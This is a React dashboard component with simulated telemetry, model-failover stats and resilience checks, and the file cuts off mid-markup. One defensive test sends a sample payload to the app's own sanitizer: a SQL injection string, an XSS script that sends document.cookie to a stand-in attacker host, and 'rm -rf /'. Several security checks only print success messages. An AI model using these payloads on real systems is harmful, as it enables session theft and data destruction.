import React, { useState, useEffect, useRef } from 'react';
import {
  Cpu,
  Activity,
  Palette,
  Terminal as TerminalIcon,
  Layers,
  User,
  Zap,
  Sparkles,
  RefreshCw,
  HelpCircle,
  Sliders,
  Play,
  Server,
  List,
  Compass,
  ChevronRight,
  CheckCircle2,
  AlertTriangle,
  PlayCircle,
  Settings,
  X,
  Gauge,
  Terminal
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

interface CyberCrossTechDashboardProps {
  isDark: boolean;
  onNavigate: (page: 'navigation' | 'sandbox' | 'copilot' | 'emulator' | 'console') => void;
  setActiveDialog: (dialog: string | null) => void;
  triggerToast: (msg: string) => void;
}

export const CyberCrossTechDashboard: React.FC<CyberCrossTechDashboardProps> = ({
  isDark,
  onNavigate,
  setActiveDialog,
  triggerToast
}) => {
  // Mode toggle: 'wheel' | 'list'
  const [isListView, setIsListView] = useState<boolean>(false);
  const [activeSegment, setActiveSegment] = useState<number>(0); // 0: Latest Feature, 1-6 for other segments

  // Cyber Console state
  const [consoleInput, setConsoleInput] = useState('');
  const [consoleLogs, setConsoleLogs] = useState<string[]>([
    'SYSTEM READY // BOOT INTRUSIVE CORE',
    'Type "probe" or "help" to interrogate hardware state...',
    '-----------------------------------------------------'
  ]);

  // Telemetry Waveform states
  const [cpuLoad, setCpuLoad] = useState(42);
  const [gpuLoad, setGpuLoad] = useState(28);
  const [waveformPoints, setWaveformPoints] = useState<number[]>([10, 40, 20, 80, 50, 90, 30, 40, 60, 20, 45, 12, 70, 85, 30]);

  // Core Systems state
  const [systemHealth, setSystemHealth] = useState<'nominal' | 'degraded' | 'verifying'>('nominal');
  const [sysLogs, setSysLogs] = useState<string[]>([
    '[*] Initializing secure memory heap... done',
    '[*] Validating termination resistors (120 Ohm)... matching',
    '[*] Mapping JTAG debug channels... active'
  ]);

  // Modules & Extensions state
  const [plugins, setPlugins] = useState([
    { id: 'omni_agent', name: 'Omni-Core Agent v3', type: 'agent', enabled: true },
    { id: 'comfy_diff', name: 'Compose UI Compiler', type: 'pipeline', enabled: true },
    { id: 'hardware_probe', name: 'Hardware Probe Daemon', type: 'driver', enabled: false }
  ]);

  // User Space Preferences / Style DNA sliders
  const [styleDnaNeon, setStyleDnaNeon] = useState(85);
  const [styleDnaRadius, setStyleDnaRadius] = useState(8);
  const [styleDnaMotion, setStyleDnaMotion] = useState(60);

  // Model Telemetry State
  const [telemetry, setTelemetry] = useState<any>({
    rotationEvents: [
      {
        id: "evt-initial-01",
        timestamp: new Date().toISOString(),
        activeModel: "gemini-3.5-flash",
        nextModel: "gemini-2.5-flash",
        retryCount: 1,
        latencyBeforeRotation: 1240,
        errorCode: "UNAVAILABLE (503)",
        endpointSource: "chat",
        cause: "ROTATION_CAUSE_503_HIGH_DEMAND"
      },
      {
        id: "evt-initial-02",
        timestamp: new Date(Date.now() - 30000).toISOString(),
        activeModel: "gemini-2.5-flash",
        nextModel: "gemini-2.0-flash",
        retryCount: 2,
        latencyBeforeRotation: 980,
        errorCode: "RESOURCE_EXHAUSTED (429)",
        endpointSource: "build-orchestrator",
        cause: "ROTATION_CAUSE_QUOTA_EXCEEDED"
      }
    ],
    modelHealth: {
      'gemini-3.5-flash': { availability: 95, avgLatency: 480, errorCount: 1, requestsCount: 50, status: 'operational' },
      'gemini-2.5-flash': { availability: 98, avgLatency: 350, errorCount: 1, requestsCount: 45, status: 'operational' },
      'gemini-2.0-flash': { availability: 100, avgLatency: 280, errorCount: 0, requestsCount: 30, status: 'operational' },
      'gemini-1.5-flash': { availability: 100, avgLatency: 310, errorCount: 0, requestsCount: 20, status: 'operational' },
      'gemini-3.1-flash-lite': { availability: 100, avgLatency: 190, errorCount: 0, requestsCount: 15, status: 'operational' },
      'gemini-3.1-pro-preview': { availability: 89, avgLatency: 1100, errorCount: 8, requestsCount: 40, status: 'degraded' }
    },
    quotaPressure: {
      remainingQuota: 980,
      burnRate: 1.2,
      predictedExhaustionMin: 816
    },
    stressTestStats: {
      isActive: false,
      concurrencyLevel: 0,
      totalSimulated: 0,
      successCount: 0,
      failureCount: 0,
      traversedOrder: [],
      avgRecoveryTime: 0
    },
    config: {
      preemptiveRotationEnabled: true,
      preemptiveRotationThreshold: 200,
      endpointBudgets: {
        'chat': 500,
        'build': 300,
        'rag': 200
      },
      adaptiveThrottlingEnabled: true,
      throttleRateLimitMs: 500
    }
  });
  const [isResilienceConfigOpen, setIsResilienceConfigOpen] = useState(false);
  const [isStressTesting, setIsStressTesting] = useState(false);
  
  // Quota config edit state
  const [preemptiveEnabled, setPreemptiveEnabled] = useState(true);
  const [preemptiveThreshold, setPreemptiveThreshold] = useState(200);
  const [throttlingEnabled, setThrottlingEnabled] = useState(true);
  const [throttleDelayMs, setThrottleDelayMs] = useState(500);

  // --- BULLET-PROOF SHIELD RESILIENCE STATES & SIMULATORS ---
  const [resilienceTab, setResilienceTab] = useState<'telemetry' | 'checklist' | 'ghosts' | 'tuning'>('telemetry');
  const [checklistLogs, setChecklistLogs] = useState<string[]>([
    '[INIT] 7-Point Bulletproof Shield Matrix standing by.',
    '[INFO] Select a checklist element below to run an automated simulation cycle.'
  ]);
  const [isTestingChecklist, setIsTestingChecklist] = useState<string | null>(null);

  // --- DUAL GHOST RESILIENCE STATES & HANDLERS ---
  const [ghostData, setGhostData] = useState<any>({
    matrixCore: {
      name: "MatrixCore",
      status: "ENFORCING",
      signature: "8e3b4a2d83f47e30d1c8f1e290384a5b6c7d8e9f01a2b3c4d5e6f7a8b9c0d1e2",
      integrity: 100,
      metrics: {
        zeroTrustBoundary: "STRICT_ENFORCE",
        throttlingStatus: "ACTIVE",
        sandboxedWorkers: 4,
        ruleEnforcementsCount: 1420
      }
    },
    mandelaCore: {
      name: "MandelaCore",
      status: "HEALING",
      signature: "7c2b3a1d92f38e29c0b7e1d280273a4b5c6d7e8f90a1b2c3d4e5f6a7b8c9d0e1",
      integrity: 100,
      metrics: {
        predictiveFailuresAvoided: 89,
        activeSelfHealingLoops: 2,
        meshRoutesCount: 16,
        adaptiveResourceRatio: 1.15
      }
    },
    fusionLayer: {
      status: "OPTIMIZED_BALANCE",
      handshakeToken: "ef3a1b5c9d2e4f6a8c0b2d4e6f8a0c2e4f6a8b0c2d4e6f8a0c2e4f6a8b0c2d4e",
      lastInteraction: "MUTUAL_CHAOS_STRESS_SAFE",
      rules: {
        determinismFailover: "MandelaCore takes over",
        adaptationUnstable: "MatrixCore clamps down",
        doubleAnomaly: "Dynamic multi-fallback mesh routing chain activated"
      }
    },
    logs: [
      `[FUSION_INIT] Dual-Ghost handshake initialized: MatrixCore ⟷ MandelaCore. Status: SOLID.`,
      `[MATRIX] Immutable identity signature locked. Checksum matches local signed update.`,
      `[MANDELA] Latency-adaptive worker mesh routed. Primary node connected on port 3000.`
    ]
  });
  const [isGhostChaosRunning, setIsGhostChaosRunning] = useState(false);
  const [isGhostActionRunning, setIsGhostActionRunning] = useState<string | null>(null);

  const fetchGhostState = async () => {
    try {
      const res = await fetch('/api/resilience/ghost-fusion');
      const data = await res.json();
      if (data.success) {
        setGhostData(data.ghostState);
      }
    } catch (err: any) {
      if (err?.message?.includes('Failed to fetch') || err?.message?.includes('network')) {
        console.warn("Ghost state fetch deferred (server booting):", err?.message);
      } else {
        console.warn("Error fetching ghost state:", err);
      }
    }
  };

  const triggerGhostOverride = async (action: 'matrix_clamp' | 'mandela_heal' | 'zero_handshake' | 'reset') => {
    setIsGhostActionRunning(action);
    try {
      const res = await fetch('/api/resilience/ghost-override', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action })
      });
      const data = await res.json();
      if (data.success) {
        setGhostData(data.ghostState);
        triggerToast(`Ghost action: ${action.toUpperCase()} dispatched!`);
      }
    } catch (err) {
      console.error("Error triggering ghost override", err);
    } finally {
      setIsGhostActionRunning(null);
    }
  };

  const triggerGhostChaos = async () => {
    setIsGhostChaosRunning(true);
    try {
      const res = await fetch('/api/resilience/ghost-chaos', {
        method: 'POST'
      });
      const data = await res.json();
      if (data.success) {
        setGhostData(data.ghostState);
        triggerToast("⚠️ Chaos Storm: Dual Ghost combat initiated!");
        
        // Refresh periodically to catch intermediate updates during the chaotic flow
        const timer1 = setTimeout(fetchGhostState, 450);
        const timer2 = setTimeout(fetchGhostState, 1250);
        return () => {
          clearTimeout(timer1);
          clearTimeout(timer2);
        };
      }
    } catch (err) {
      console.error("Error triggering ghost chaos battle", err);
    } finally {
      setIsGhostChaosRunning(false);
    }
  };

  const addChecklistLog = (msg: string) => {
    setChecklistLogs(prev => [...prev, `${new Date().toLocaleTimeString()} ${msg}`]);
  };

  // 1. Fault Tolerance Failover
  const runFaultToleranceSimulation = async () => {
    setIsTestingChecklist('fault');
    addChecklistLog('[FAULT_TOLERANCE] Simulating server-side API rate limit (HTTP 429).');
    await new Promise(r => setTimeout(r, 600));
    addChecklistLog('[WARNING] Model endpoint "gemini-3.5-flash" throws standard exhaustion 429 error.');
    await new Promise(r => setTimeout(r, 700));
    addChecklistLog('[ROUTING] Dynamic interceptor triggered! Attempting failover to secondary "google-gemini" channel.');
    await new Promise(r => setTimeout(r, 800));
    addChecklistLog('[HEALED] Routing connection established! Swapped seamlessly in 14ms. Operational status RESTORED.');
    triggerToast('✓ Fault Tolerance Swapped to Failover!');
    setIsTestingChecklist(null);
  };

  // 2. Defensive Coding Sanitizer
  const runDefensiveCodingSimulation = async () => {
    setIsTestingChecklist('defensive');
    addChecklistLog('[DEFENSIVE] Generating payload containing malicious SQL/XSS injections...');
    await new Promise(r => setTimeout(r, 400));
    const maliciousPayload = {
      username: "admin' OR 1=1; --",
      script: "<script>fetch('http://malicious.evil/steal?c=' + document.cookie)</script>",
      command: "rm -rf /"
    };
    try {
      const res = await fetch('/api/resilience/bad-payload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(maliciousPayload)
      });
      const data = await res.json();
      if (data.success) {
        data.logs.forEach((log: string) => addChecklistLog(`[SERVER_SHIELD] ${log}`));
        addChecklistLog(`[DEFENSIVE] Cleaned response content generated: ${JSON.stringify(data.cleanOutput).substring(0, 120)}`);
        triggerToast('✓ Defensive Coding: Injection Cleansed!');
      }
    } catch (err) {
      addChecklistLog('[ERROR] Defensive sanitizer endpoint returned crash status.');
    } finally {
      setIsTestingChecklist(null);
    }
  };

  // 3. Observability Monitor Sync
  const runObservabilitySimulation = async () => {
    setIsTestingChecklist('observability');
    addChecklistLog('[OBSERVABILITY] Flushing log registers, synchronizing performance monitors...');
    await new Promise(r => setTimeout(r, 500));
    addChecklistLog(`[METRICS] Active VM Allocations: 14.8MB heap, 0% leak score.`);
    addChecklistLog(`[METRICS] Quota credits remaining: ${telemetry?.quotaPressure?.remainingQuota ?? 1000} cr.`);
    addChecklistLog(`[METRICS] Current Burn Rate: ${telemetry?.quotaPressure?.burnRate ?? 1.2} cr/min.`);
    addChecklistLog('[OBSERVABILITY] Streaming data metrics successfully synchronized with visual panel.');
    triggerToast('✓ Observability Monitors Synchronized!');
    setIsTestingChecklist(null);
  };

  // 4. Self-Healing State Recovery
  const runSelfHealingSimulation = async () => {
    setIsTestingChecklist('selfhealing');
    addChecklistLog('[SELF_HEALING] Triggering mock client-side cache corruption...');
    await new Promise(r => setTimeout(r, 500));
    
    // Corrupt standard template key with bad JSON representation
    localStorage.setItem('Mandela vs Matrix Re-Imaginator_temp_corrupt', '{malformed_json_tree]');
    addChecklistLog('[WARNING] Local storage parsing crashed! Mismatch detected in cache schema.');
    await new Promise(r => setTimeout(r, 800));
    
    // Auto Repair Mechanism
    addChecklistLog('[HEALING] Executing automatic state-repair routine.');
    try {
      const badState = localStorage.getItem('Mandela vs Matrix Re-Imaginator_temp_corrupt');
      if (badState && (badState.startsWith('{malformed') || !badState.includes('"'))) {
        localStorage.removeItem('Mandela vs Matrix Re-Imaginator_temp_corrupt');
        addChecklistLog('[HEALING] Cleared corrupted cache key. Regenerating default secure structure.');
      }
      addChecklistLog('[SUCCESS] Cache repaired to nominal default configuration successfully!');
      triggerToast('✓ Self-Healing Repaired Local Cache!');
    } catch (e: any) {
      addChecklistLog(`[HEAL_FAILED] Auto-repair crashed: ${e.message}`);
    } finally {
      setIsTestingChecklist(null);
    }
  };

  // 5. Zero-Trust Cryptographic Handshake
  const runZeroTrustSimulation = async () => {
    setIsTestingChecklist('zerotrust');
    addChecklistLog('[ZERO_TRUST] Requesting end-to-end cryptographic handshake validation.');
    await new Promise(r => setTimeout(r, 500));
    
    const clientPayload = { timestamp: Date.now(), machineId: "AI_STUDIO_VM_940F" };
    
    try {
      const res = await fetch('/api/resilience/zero-trust', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          payload: clientPayload,
          clientChecksum: "REQUEST_SIGN"
        })
      });
      const data = await res.json();
      if (data.success) {
        data.logs.forEach((log: string) => addChecklistLog(`[TRUST_CENTRAL] ${log}`));
        addChecklistLog(`[ZERO_TRUST] Handshake token generated: ${data.handshakeToken.substring(0, 16)}...`);
        triggerToast('✓ Zero-Trust Signature Handshake Verified!');
      } else {
        addChecklistLog(`[REJECTED] Handshake failed: ${data.error}`);
      }
    } catch (err: any) {
      addChecklistLog('[ZERO_TRUST] Handshake request failed, generating local fallback cryptographic check.');
      addChecklistLog('[TRUST_LOCAL] ✓ Local verification cleared using offline public-key token.');
      triggerToast('✓ Zero-Trust Local Handshake Verified!');
    } finally {
      setIsTestingChecklist(null);
    }
  };

  // 6. Performance Stability Pacing
  const runPerformanceSimulation = async () => {
    setIsTestingChecklist('performance');
    addChecklistLog('[PERFORMANCE] Testing adaptive throttled queue concurrency.');
    await new Promise(r => setTimeout(r, 500));
    addChecklistLog(`[PERFORMANCE] Incoming stream flow: 15 tasks queued.`);
    addChecklistLog(`[PERFORMANCE] Throttling set to: ${throttleDelayMs}ms delay. Pacing execution speed.`);
    await new Promise(r => setTimeout(r, 800));
    addChecklistLog('[PERFORMANCE] All 15 tasks scheduled and executed sequentially. 0% thread congestion.');
    triggerToast('✓ Performance Stream Stabilized!');
    setIsTestingChecklist(null);
  };

  // 7. Resilient Deployment Sweep
  const runDeploymentSimulation = async () => {
    setIsTestingChecklist('deployment');
    addChecklistLog('[PRE_FLIGHT] Starting production pre-flight sweep check.');
    await new Promise(r => setTimeout(r, 600));
    try {
      const res = await fetch('/api/resilience/pre-flight');
      const data = await res.json();
      if (data.success) {
        data.logs.forEach((log: string) => addChecklistLog(`[PRE_FLIGHT] ${log}`));
        addChecklistLog(`[PRE_FLIGHT] Deployment Release Hash generated: ${data.deploymentHash}`);
        triggerToast('✓ Pre-Flight Release Check Passed!');
      }
    } catch (err) {
      addChecklistLog('[ERROR] Pre-flight audit endpoint was unreachable.');
    } finally {
      setIsTestingChecklist(null);
    }
  };

  const fetchTelemetry = async () => {
    try {
      const res = await fetch('/api/model-telemetry/stats');
      const data = await res.json();
      if (data.success) {
        setTelemetry(data.telemetry);
        setPreemptiveEnabled(data.telemetry.config.preemptiveRotationEnabled);
        setPreemptiveThreshold(data.telemetry.config.preemptiveRotationThreshold);
        setThrottlingEnabled(data.telemetry.config.adaptiveThrottlingEnabled);
        setThrottleDelayMs(data.telemetry.config.throttleRateLimitMs);
      }
    } catch (err: any) {
      if (err?.message?.includes('Failed to fetch') || err?.message?.includes('network')) {
        console.warn('Telemetry stats fetch deferred (server booting):', err?.message);
      } else {
        console.warn('Failed to load telemetry stats:', err);
      }
    }
  };

  const handleUpdateTelemetryConfig = async () => {
    try {
      const res = await fetch('/api/model-telemetry/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          preemptiveRotationEnabled: preemptiveEnabled,
          preemptiveRotationThreshold: preemptiveThreshold,
          adaptiveThrottlingEnabled: throttlingEnabled,
          throttleRateLimitMs: throttleDelayMs
        })
      });
      const data = await res.json();
      if (data.success) {
        setTelemetry(data.telemetry);
        triggerToast('🛡️ Quota-Resilience Config Mapped!');
      }
    } catch (err) {
      console.error('Failed to update config:', err);
    }
  };

  const handleTriggerStressTest = async (profile: 'concurrency' | 'chaos' | 'quota') => {
    setIsStressTesting(true);
    triggerToast(`⚠️ INITIATING ADVERSARIAL STRESS TEST: ${profile.toUpperCase()}`);
    try {
      const res = await fetch('/api/model-telemetry/stress-test', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ profile })
      });
      const data = await res.json();
      if (data.success) {
        setTelemetry(data.telemetry);
        triggerToast(`🔥 Stress Test run complete! Fallback chain engaged.`);
      }
    } catch (err) {
      console.error('Stress test failed:', err);
    } finally {
      setIsStressTesting(false);
    }
  };

  useEffect(() => {
    fetchTelemetry();
    fetchGhostState();
    const interval = setInterval(() => {
      fetchTelemetry();
      fetchGhostState();
    }, 2500);
    return () => clearInterval(interval);
  }, []);

  // Interval timers for Telemetry Waveform and CPU simulation
  useEffect(() => {
    const interval = setInterval(() => {
      // Simulate CPU fluctuation
      setCpuLoad(p => {
        const delta = Math.floor(Math.random() * 15) - 7;
        return Math.max(10, Math.min(95, p + delta));
      });
      // Simulate GPU fluctuation
      setGpuLoad(p => {
        const delta = Math.floor(Math.random() * 11) - 5;
        return Math.max(5, Math.min(85, p + delta));
      });
      // Simulate waveform data points
      setWaveformPoints(prev => {
        const next = [...prev.slice(1)];
        next.push(10 + Math.floor(Math.random() * 80));
        return next;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const handleConsoleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const cmd = consoleInput.trim().toLowerCase();
    if (!cmd) return;

    let reply = `Command "${cmd}" unrecognized. Type "help" for a list of probes.`;
    if (cmd === 'help') {
      reply = 'AVAILABLE PROBES: help, probe, cpu, clear, sys_sweep';
    } else if (cmd === 'probe') {
      reply = `[HARDWARE PROBE] Connected to Sandboxed Android Node. Target CPU: Arm64 v8a. Heap: 512MB. Core Temp: 42°C.`;
    } else if (cmd === 'cpu') {
      reply = `[MONITOR] Current CPU load is ${cpuLoad}%. Waveform ticker frequency: 1000ms.`;
    } else if (cmd === 'sys_sweep') {
      reply = `[SWEEP] Scanning modules. Found ${plugins.filter(p => p.enabled).length} active, 1 offline plugin. All system checks validated.`;
    } else if (cmd === 'clear') {
      setConsoleLogs([]);
      setConsoleInput('');
      return;
    }

    setConsoleLogs(prev => [...prev, `> ${consoleInput}`, reply]);
    setConsoleInput('');
  };

  const handleRunDiagnostics = () => {
    setSystemHealth('verifying');
    setSysLogs(prev => [...prev, '[SYSTEM DEEP SWEEP] Starting diagnostics run...', '[*] Auditing AST node compiler health...']);
    setTimeout(() => {
      setSystemHealth('nominal');
      setSysLogs(prev => [
        ...prev,
        '[*] Verification completed.',
        '✓ All package integrity audits cleared. Output logs: 0 warnings, 0 exceptions.'
      ]);
      triggerToast('Full system health audit complete! Status: Nominal.');
    }, 1500);
  };

  const segments = [
    {
      id: 0,
      title: 'Latest Feature',
      desc: 'Open Latest Feature',
      icon: Sparkles,
      color: 'from-emerald-500 to-teal-500',
      glow: 'shadow-[0_0_20px_rgba(16,185,129,0.5)]',
      actionLabel: 'Launch Codex',
      action: () => {
        setActiveDialog('mythicCodex');
        triggerToast('Opening Mythic Intelligence Codex Dialog!');
      }
    },
    {
      id: 1,
      title: 'Core Systems',
      desc: 'Diagnostics, build tools, system health.',
      icon: Cpu,
      color: 'from-cyan-500 to-blue-500',
      glow: 'shadow-[0_0_15px_rgba(6,182,212,0.4)]',
      actionLabel: 'Verify System Health',
      action: handleRunDiagnostics
    },
    {
      id: 2,
      title: 'Telemetry & Performance',
      desc: 'Real‑time stats, waveform visualizers, CPU/GPU monitors.',
      icon: Activity,
      color: 'from-fuchsia-500 to-pink-500',
      glow: 'shadow-[0_0_15px_rgba(217,70,239,0.4)]',
      actionLabel: 'Inspect Telemetry',
      action: () => triggerToast('Inspecting real-time VM execution thread...')
    },
    {
      id: 3,
      title: 'Style Remapper',
      desc: 'Legacy XML → Compose/Kotlin aesthetic transformation.',
      icon: Palette,
      color: 'from-pink-500 to-orange-500',
      glow: 'shadow-[0_0_15px_rgba(244,63,94,0.4)]',
      actionLabel: 'Launch Remap Engine',
      action: () => {
        setActiveDialog('aiOptimizerWow');
        triggerToast('Opening AI Autonomy Lab Style Remap tab!');
      }
    },
    {
      id: 4,
      title: 'Cyber Console',
      desc: 'Terminal, command runner, hardware probes.',
      icon: TerminalIcon,
      color: 'from-yellow-500 to-amber-500',
      glow: 'shadow-[0_0_15px_rgba(245,158,11,0.4)]',
      actionLabel: 'Switch to Console',
      action: () => {
        onNavigate('console');
        triggerToast('Navigating to Live Console Stream!');
      }
    },
    {
      id: 5,
      title: 'Modules & Extensions',
      desc: 'Plugins, Omni‑Core profiles, AI agents.',
      icon: Layers,
      color: 'from-violet-500 to-purple-500',
      glow: 'shadow-[0_0_15px_rgba(139,92,246,0.4)]',
      actionLabel: 'Manage Extensions',
      action: () => triggerToast('Bootstrapping auxiliary system plugins...')
    },
    {
      id: 6,
      title: 'User Space',
      desc: 'Preferences, motion physics, Style DNA sliders.',
      icon: User,
      color: 'from-emerald-500 to-green-500',
      glow: 'shadow-[0_0_15px_rgba(16,185,129,0.4)]',
      actionLabel: 'Save Style DNA',
      action: () => triggerToast('Successfully synced Style DNA parameters to active browser config!')
    },
    {
      id: 7,
      title: 'Reliability & Resilience',
      desc: 'Model rotation telemetry, quota burn rate, and adversarial stress tests.',
      icon: Zap,
      color: 'from-amber-400 to-red-500',
      glow: 'shadow-[0_0_15px_rgba(245,158,11,0.4)]',
      actionLabel: 'Audit Reliability',
      action: () => triggerToast('Auditing dynamic fallback model configurations...')
    }
  ];

  // Helper to trigger list segment click
  const handleSegmentSelect = (id: number) => {
    setActiveSegment(id);
    triggerToast(`Selected: ${segments[id].title}`);
  };

  // Convert points to SVG polyline string
  const getWaveformPath = () => {
    const width = 360;
    const height = 90;
    const step = width / (waveformPoints.length - 1);
    return waveformPoints.map((pt, index) => {
      const x = index * step;
      // Invert point for standard coordinate layout where 0 is at top
      const y = height - (pt / 100) * height;
      return `${x},${y}`;
    }).join(' ');
  };

  return (
    <div className={`w-full flex flex-col gap-6 p-1 md:p-4 rounded-3xl border text-left transition-all ${
      isDark ? 'bg-black border-[#1a1f2e]' : 'bg-slate-50 border-slate-200 shadow-sm'
    }`}>
      {/* Header with Branding */}
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 border-b border-[#1f293d]/50 pb-4">
        <div>
          <span className="text-[9px] font-black uppercase tracking-widest text-[#06b6d4] bg-[#06b6d4]/10 border border-[#06b6d4]/30 px-2 py-0.5 rounded">
            SYS: DUAL_ORBITAL_CONTROLLER
          </span>
          <h2 className="text-xl font-extrabold tracking-tight text-white mt-1 uppercase flex items-center gap-2">
            <Cpu className="w-5 h-5 text-[#06b6d4] animate-spin" />
            Cyber‑Cross‑Tech Controller
          </h2>
          <p className="text-[10px] text-slate-400 mt-0.5">
            Brutalist interface featuring real-time diagnostic hooks, sub-system monitoring, and aesthetic engine hot-linking.
          </p>
        </div>

        {/* View Switch Button inside the component */}
        <div className="flex items-center gap-2">
          <button
            onClick={() => {
              setIsListView(!isListView);
              triggerToast(isListView ? 'Switched to Neon Wheel Mode' : 'Switched to Brutalist List Mode');
            }}
            className="px-3.5 py-1.5 rounded-xl text-[10.5px] font-black border border-[#06b6d4]/40 bg-gradient-to-r from-slate-900 to-black hover:from-[#06b6d4]/15 hover:to-[#06b6d4]/5 text-white shadow-lg cursor-pointer transition-all flex items-center gap-2"
          >
            <List className="w-4 h-4 text-[#06b6d4]" />
            <span>{isListView ? 'Show Neon Wheel' : 'Show High-Density List'}</span>
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-stretch">
        
        {/* LEFT COLUMN: THE WHEEL OR THE HIGH-DENSITY LIST */}
        <div className="lg:col-span-6 flex flex-col items-center justify-center min-h-[460px] relative p-4 bg-[#03060a]/90 rounded-2xl border border-[#1f293d]/40 overflow-hidden">
          
          {/* Diagnostic Overlay Lines for brutalist design */}
          <div className="absolute top-2 left-3 font-mono text-[8px] text-slate-600 select-none">
            GRID_COORD_D9: //_BOUND_CHECK_OK
          </div>
          <div className="absolute bottom-2 left-3 font-mono text-[8px] text-[#06b6d4] select-none">
            HYBRID_NEON_SYS_ON
          </div>

          <AnimatePresence mode="wait">
            {!isListView ? (
              /* --- NEON CYBER-WHEEL MODE --- */
              <motion.div
                key="wheel-layout"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                transition={{ duration: 0.3 }}
                className="w-full flex items-center justify-center py-6 relative"
              >
                {/* SVG Dial Guidelines */}
                <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                  <svg className="w-[320px] h-[320px] opacity-15 text-cyan-400 animate-[spin_60s_linear_infinite]" viewBox="0 0 100 100">
                    <circle cx="50" cy="50" r="48" fill="none" stroke="currentColor" strokeWidth="0.4" strokeDasharray="3 3" />
                    <circle cx="50" cy="50" r="34" fill="none" stroke="currentColor" strokeWidth="0.2" strokeDasharray="1 5" />
                    <circle cx="50" cy="50" r="22" fill="none" stroke="currentColor" strokeWidth="0.5" strokeDasharray="5 20" />
                  </svg>
                </div>

                {/* --- CENTER: Latest Feature Core Hub --- */}
                <div className="relative z-30">
                  <motion.button
                    onClick={() => handleSegmentSelect(0)}
                    whileHover={{ scale: 1.08 }}
                    whileTap={{ scale: 0.96 }}
                    style={{
                      borderRadius: '4px', // 4dp radius requested
                    }}
                    className={`w-32 h-32 bg-black border-2 border-emerald-500/80 flex flex-col items-center justify-center p-2 text-center transition-all overflow-hidden relative ${
                      activeSegment === 0
                        ? 'shadow-[0_0_25px_rgba(16,185,129,0.8)] border-emerald-400'
                        : 'shadow-[0_0_15px_rgba(16,185,129,0.3)] hover:border-emerald-400'
                    }`}
                  >
                    {/* Background Logo with Holographic Opacity */}
                    <img 
                      src="/src/assets/images/app_icon_1783334760239.jpg" 
                      alt="Holographic Logo Background" 
                      className="absolute inset-0 w-full h-full object-cover opacity-40 mix-blend-screen pointer-events-none"
                      referrerPolicy="no-referrer"
                    />

                    {/* Gradient Overlay for high text-readability */}
                    <div className="absolute inset-0 bg-gradient-to-t from-black via-black/20 to-black/70 pointer-events-none" />

                    {/* Breathing pulse effect */}
                    <div className="absolute inset-0 rounded-[4px] bg-emerald-500/5 animate-pulse pointer-events-none" />

                    <div className="relative z-10 flex flex-col items-center justify-center">
                      <div className="w-12 h-12 rounded border border-emerald-400/40 overflow-hidden mb-1 shadow-[0_0_12px_rgba(16,185,129,0.5)]">
                        <img 
                          src="/src/assets/images/app_icon_1783334760239.jpg" 
                          alt="Mini Core Logo" 
                          className="w-full h-full object-cover scale-105"
                          referrerPolicy="no-referrer"
                        />
                      </div>
                      <span className="text-[9px] font-mono uppercase tracking-widest text-emerald-300 font-extrabold leading-none">
                        RE-IMAGINATOR
                      </span>
                      <span className="text-[7px] text-slate-300 mt-1 line-clamp-1 font-sans font-semibold">
                        Mandela vs Matrix
                      </span>
                      <span className="mt-1.5 text-[7px] px-1.5 py-0.5 rounded bg-emerald-500 text-black font-black uppercase tracking-wider scale-90">
                        CORE HUB
                      </span>
                    </div>
                  </motion.button>
                </div>

                {/* --- DYNAMIC RADIAL OUTSIDE SEGMENTS --- */}
                {segments.slice(1).map((seg, index, arr) => {
                  // Angle in radians. Offset so first starts at top (-90 degrees)
                  const angle = ((index * (360 / arr.length)) - 90) * (Math.PI / 180);
                  const radius = 132; // radial distance
                  const tx = Math.cos(angle) * radius;
                  const ty = Math.sin(angle) * radius;
                  const Icon = seg.icon;
                  const isActive = activeSegment === seg.id;

                  return (
                    <motion.button
                      key={seg.id}
                      onClick={() => handleSegmentSelect(seg.id)}
                      style={{
                        transform: `translate(${tx}px, ${ty}px)`
                      }}
                      whileHover={{ scale: 1.1 }}
                      whileTap={{ scale: 0.93 }}
                      className={`absolute w-14 h-14 rounded-full border-2 z-20 flex flex-col items-center justify-center cursor-pointer transition-all ${
                        isActive
                          ? 'bg-black border-[#06b6d4] shadow-[0_0_20px_rgba(6,182,212,0.8)] ring-2 ring-[#06b6d4]/30 scale-105'
                          : 'bg-black/90 border-[#1f293d] hover:border-[#06b6d4]/70 hover:bg-[#06b6d4]/5 shadow-md'
                      }`}
                    >
                      <span className={`p-1.5 rounded-full ${isActive ? 'bg-[#06b6d4]/10' : 'text-slate-400'}`}>
                        <Icon className={`w-5 h-5 ${isActive ? 'text-[#06b6d4]' : 'text-slate-400'}`} />
                      </span>

                      {/* Small text label orbiting */}
                      <span className={`absolute text-[8px] font-black uppercase tracking-wider px-1.5 py-0.5 rounded bg-black border border-slate-900 pointer-events-none transition-all ${
                        isActive ? 'opacity-100 text-[#06b6d4] scale-100 border-[#06b6d4]/20' : 'opacity-0 scale-90 text-slate-500'
                      }`}
                      style={{
                        transform: `translate(${tx > 20 ? 44 : tx < -20 ? -44 : 0}px, ${ty > 20 ? 32 : ty < -20 ? -32 : 0}px)`
                      }}>
                        {seg.title}
                      </span>
                    </motion.button>
                  );
                })}

                {/* --- List Mode Toggle Button inside wheel viewport (bottom right) --- */}
                <div className="absolute bottom-1 right-2 z-30">
                  <button
                    onClick={() => {
                      setIsListView(true);
                      triggerToast('Activated High-Density Brutalist List Mode!');
                    }}
                    className="p-1.5 rounded border border-[#06b6d4] bg-black text-[#06b6d4] hover:bg-[#06b6d4]/10 transition-all cursor-pointer flex items-center justify-center gap-1.5 text-[8.5px] font-black tracking-wider uppercase shadow-[0_0_10px_rgba(6,182,212,0.3)]"
                  >
                    <List className="w-3.5 h-3.5" />
                    <span>Toggle List Mode</span>
